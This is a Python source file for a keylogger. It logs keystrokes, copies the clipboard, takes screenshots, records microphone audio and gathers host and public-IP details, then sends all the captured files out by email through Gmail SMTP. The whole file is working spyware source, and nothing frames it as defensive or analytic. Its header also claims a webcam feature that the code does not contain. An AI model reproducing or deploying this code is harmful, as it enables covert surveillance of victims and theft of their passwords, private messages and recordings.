"""
Program:KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
Author: Yazhini V
Date: 10/06/2025
"""

# Libraries
import os
import socket
import platform
import logging
import threading
import smtplib
import time

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from pynput.keyboard import Key, Listener
from requests import get
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
import win32clipboard

# ------------- CONFIGURATION ----------------
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Use Gmail App Password (not your real password)
TO_ADDRESS = "recipient_email@gmail.com"

# File names
KEYS_FILE = "key_log.txt"
SYSTEM_FILE = "system_info.txt"
CLIPBOARD_FILE = "clipboard_info.txt"
SCREENSHOT_FILE = "screenshot.png"
AUDIO_FILE = "audio.wav"

FILE_PATH = os.getcwd()

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ------------- FUNCTION DEFINITIONS ----------------

def send_email(filename, attachment_path, toaddr):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = toaddr
    msg['Subject'] = f'Logged File: {filename}'

    try:
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {filename}')
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        logging.info(f"Sent {filename} to {toaddr}")

    except Exception as e:
        logging.error(f"Failed to send {filename}: {e}")

def get_system_info():
    try:
        with open(os.path.join(FILE_PATH, SYSTEM_FILE), 'w') as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP Address: {public_ip}\n")
            except:
                f.write("Could not get Public IP\n")

            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")

    except Exception as e:
        logging.error(f"System info error: {e}")

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        with open(os.path.join(FILE_PATH, CLIPBOARD_FILE), 'w', encoding='utf-8') as f:
            f.write(f"Clipboard Data:\n{data}\n")

    except:
        with open(os.path.join(FILE_PATH, CLIPBOARD_FILE), 'w') as f:
            f.write("Could not retrieve clipboard data\n")

def record_microphone(duration=10, fs=44100):
    try:
        logging.info("Recording audio...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(os.path.join(FILE_PATH, AUDIO_FILE), fs, recording)
        logging.info("Audio recorded.")
    except Exception as e:
        logging.error(f"Audio recording error: {e}")

def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(os.path.join(FILE_PATH, SCREENSHOT_FILE))
        logging.info("Screenshot taken.")
    except Exception as e:
        logging.error(f"Screenshot error: {e}")

def on_press(key):
    try:
        with open(os.path.join(FILE_PATH, KEYS_FILE), 'a') as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                if key == Key.space:
                    f.write(' ')
                elif key == Key.enter:
                    f.write('\n')
                elif key == Key.tab:
                    f.write('\t')
                else:
                    f.write(f' [{key}] ')
    except Exception as e:
        logging.error(f"Keystroke error: {e}")

def on_release(key):
    if key == Key.esc:
        logging.info("ESC pressed, exiting keylogger.")
        return False

# ------------- MAIN FUNCTION ----------------

def run_keylogger():
    logging.info("Starting keylogger...")

    get_system_info()
    get_clipboard()

    screenshot_thread = threading.Thread(target=take_screenshot)
    audio_thread = threading.Thread(target=record_microphone)

    screenshot_thread.start()
    audio_thread.start()

    screenshot_thread.join()
    audio_thread.join()

    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        logging.info("Keylogger listener stopped.")

    logging.info("Keylogger finished, sending data...")

    for file in [KEYS_FILE, SYSTEM_FILE, CLIPBOARD_FILE, SCREENSHOT_FILE, AUDIO_FILE]:
        path = os.path.join(FILE_PATH, file)
        if os.path.exists(path):
            send_email(file, path, TO_ADDRESS)
        else:
            logging.warning(f"{file} not found.")

if __name__ == "__main__":
    run_keylogger()
